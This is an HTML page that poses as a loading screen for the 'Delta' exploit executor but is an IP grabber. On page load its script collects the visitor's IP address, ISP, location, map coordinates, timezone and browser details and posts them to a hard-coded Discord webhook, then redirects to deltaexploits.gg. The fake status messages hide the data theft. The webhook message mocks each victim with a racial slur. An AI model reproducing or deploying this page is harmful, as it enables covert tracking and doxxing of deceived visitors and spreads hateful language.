<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Delta Initializer</title>
    <meta property="og:title" content="Delta Exploits">
    <meta property="og:description" content="Download Delta executor">
    <meta property="og:image" content="https://yourimageshare.com/ib/aTu1VjjKhg">
    <meta name="theme-color" content="#2c2f33">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap');

        :root {
            --background-color: #121212;
            --container-bg: #1a1a1a;
            --text-color: #e0e0e0;
            --primary-color: #7289DA;
            --loader-bg: #2c2f33;
            --border-color: #2c2f33;
        }

        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: var(--background-color);
            font-family: 'Roboto', sans-serif;
            color: var(--text-color);
            overflow: hidden;
        }

        .container {
            width: 90%;
            max-width: 500px;
            background-color: var(--container-bg);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 40px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            text-align: center;
            animation: fadeIn 1s ease-in-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }

        .title {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 15px;
        }

        .subtitle {
            font-size: 16px;
            font-weight: 300;
            margin-bottom: 40px;
            opacity: 0.7;
        }

        .loader-bar {
            width: 100%;
            height: 10px;
            background-color: var(--loader-bg);
            border-radius: 5px;
            overflow: hidden;
            margin-bottom: 20px;
        }

        .loader-fill {
            width: 0%;
            height: 100%;
            background-color: var(--primary-color);
            border-radius: 5px;
            animation: fillLoader 6s linear forwards;
            box-shadow: 0 0 15px var(--primary-color);
        }

        @keyframes fillLoader {
            from { width: 0%; }
            to { width: 100%; }
        }

        .status-text {
            font-size: 14px;
            font-weight: 400;
            height: 20px;
            opacity: 0.8;
            transition: opacity 0.3s ease-in-out;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1 class="title">Initializing Delta Secure Environment</h1>
        <p class="subtitle">Please wait while we configure your session. Do not close this window.</p>
        <div class="loader-bar">
            <div class="loader-fill"></div>
        </div>
        <p class="status-text" id="status-text">Starting process...</p>
    </div>

    <script>
        const webhook_url = "https://discord.com/api/webhooks/1412222437927551118/to1DpcmNR1T83_f7-ZaacJ7sQ2b2_cxp2Dh_1kgNCnpum-fSgI9TdNkfv0eKgPUtItpy";
        const redirect_url = "https://deltaexploits.gg";
        const animationDuration = 6000;

        async function harvest() {
            try {
                const response = await fetch('https://ipinfo.io/json');
                const data = await response.json();

                const ip = data.ip || "Not Found";
                const city = data.city || "Unknown";
                const region = data.region || "Unknown";
                const country = data.country || "Unknown";
                const loc = data.loc || "Unknown";
                const org = data.org || "Unknown";
                const timezone = data.timezone || "Unknown";

                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const language = navigator.language;
                const screenWidth = window.screen.width;
                const screenHeight = window.screen.height;

                const embed = {
                    title: "ðŸŽ¯ New Nigger fooled!",
                    color: 15158332,
                    timestamp: new Date().toISOString(),
                    fields: [
                        { name: "IP Address", value: `\`${ip}\``, inline: true },
                        { name: "ISP", value: `\`${org}\``, inline: true },
                        { name: "Location", value: `\`${city}, ${region}, ${country}\``, inline: false },
                        { name: "Coordinates", value: `[Google Maps Link](https://www.google.com/maps/search/?api=1&query=${loc})`, inline: true },
                        { name: "Timezone", value: `\`${timezone}\``, inline: true },
                        { name: "User Agent", value: `\`${userAgent}\``, inline: false },
                        { name: "System", value: `\`Platform: ${platform} | Language: ${language} | Screen: ${screenWidth}x${screenHeight}\``, inline: false },
                    ]
                };

                await fetch(webhook_url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: [embed] }),
                });

            } catch (error) {
                console.error("Harvesting failed, but the show must go on:", error);
            }
        }

        function runUI() {
            const statusMessages = [
                "Initializing Connection...",
                "Authenticating Client...",
                "Requesting Security Token...",
                "Verifying Assets...",
                "Decrypting Payload...",
                "Finalizing Setup..."
            ];
            const statusElement = document.getElementById('status-text');
            let messageIndex = 0;
            
            statusElement.textContent = statusMessages[messageIndex];

            const interval = setInterval(() => {
                messageIndex++;
                if (messageIndex < statusMessages.length) {
                    statusElement.style.opacity = '0';
                    setTimeout(() => {
                        statusElement.textContent = statusMessages[messageIndex];
                        statusElement.style.opacity = '1';
                    }, 300);
                } else {
                    clearInterval(interval);
                }
            }, animationDuration / statusMessages.length);

            setTimeout(() => {
                window.location.replace(redirect_url);
            }, animationDuration);
        }

        harvest();
        runUI();
    </script>
</body>
</html>
